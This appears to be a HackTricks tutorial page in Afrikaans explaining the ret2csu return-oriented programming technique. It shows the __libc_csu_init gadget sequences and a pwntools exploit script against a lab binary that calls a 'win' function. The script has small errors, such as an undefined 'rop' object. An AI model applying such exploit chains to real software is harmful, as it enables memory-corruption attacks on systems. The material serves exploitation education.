# Ret2csu

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

**ret2csu** is 'n haktegniek wat gebruik word wanneer jy probeer om beheer oor 'n program te neem, maar nie die **gadgets** kan vind wat jy gewoonlik gebruik om die program se gedrag te manipuleer nie.&#x20;

Wanneer 'n program sekere biblioteke gebruik (soos libc), het dit 'n paar ingeboude funksies om te bestuur hoe verskillende dele van die program met mekaar praat. Onder hierdie funksies is daar 'n paar verborge juwele wat as ons ontbrekende gadgets kan optree, veral een genaamd `__libc_csu_init`.

### Die Tovergadgets in \_\_libc\_csu\_init

In `__libc_csu_init` is daar twee reekse instruksies (ons "tovergadgets") wat uitstaan:

1. Die eerste reeks laat ons toe om waardes in verskeie registers (rbx, rbp, r12, r13, r14, r15) op te stel. Dit is soos gleuwe waar ons getalle of adresse wat ons later wil gebruik, kan stoor.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Hierdie gadget stel ons in staat om hierdie registers te beheer deur waardes van die stok af te haal en in hulle te plaas.

2. Die tweede reeks gebruik die waardes wat ons opgestel het om 'n paar dinge te doen:
* **Beweeg spesifieke waardes na ander registers**, wat hulle gereed maak vir ons om as parameters in funksies te gebruik.
* **Voer 'n oproep na 'n plek uit** wat bepaal word deur die waardes in r15 en rbx bymekaar te tel, en dan rbx met 8 te vermenigvuldig.
```
mov rdx, r14;
mov rsi, r13;
mov edi, r12d;
call qword [r15 + rbx*8];
```
## Voorbeeld

Stel jy wil 'n syscall maak of 'n funksie soos `write()` aanroep, maar jy het spesifieke waardes in die `rdx` en `rsi` registers as parameters nodig. Normaalweg sou jy soek na gadgets wat hierdie registers direk instel, maar jy kan nie enige vind nie.

Hier is waar **ret2csu** in die prentjie kom:

1. **Stel die Registers Op**: Gebruik die eerste "magic gadget" om waardes van die stok af te haal en in rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx), en r15 te plaas.
2. **Gebruik die Tweede Gadget**: Met daardie registers ingestel, gebruik jy die tweede gadget. Dit laat jou toe om jou gekose waardes in `rdx` en `rsi` te plaas (vanaf r14 en r13 onderskeidelik), wat parameters gereed maak vir 'n funksieoproep. Verder, deur `r15` en `rbx` te beheer, kan jy die program 'n funksie laat aanroep wat by die adres gele√´ is wat jy bereken en in `[r15 + rbx*8]` plaas.

Jy het 'n [**voorbeeld wat hierdie tegniek gebruik en dit verduidelik hier**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), en hierdie is die finale uitbuiting wat dit gebruik het:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Let wel dat die vorige aanval nie bedoel is om 'n **`RCE`** uit te voer nie, dit is bloot bedoel om 'n funksie genaamd `win` aan te roep (die adres van `win` neem van stdin deur gets in die ROP-ketting te roep en dit in r15 te stoor) met 'n derde argument met die waarde `0xdeadbeefcafed00d`.
{% endhint %}

### Hoekom nie net libc direk gebruik nie?

Gewoonlik is hierdie gevalle ook vatbaar vir [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), maar soms moet jy meer parameters beheer as wat maklik beheer kan word met die gadgets wat jy direk in libc vind. Byvoorbeeld, die `write()`-funksie vereis drie parameters, en **dit mag nie moontlik wees om gadgets te vind om al hierdie direk in te stel nie**.
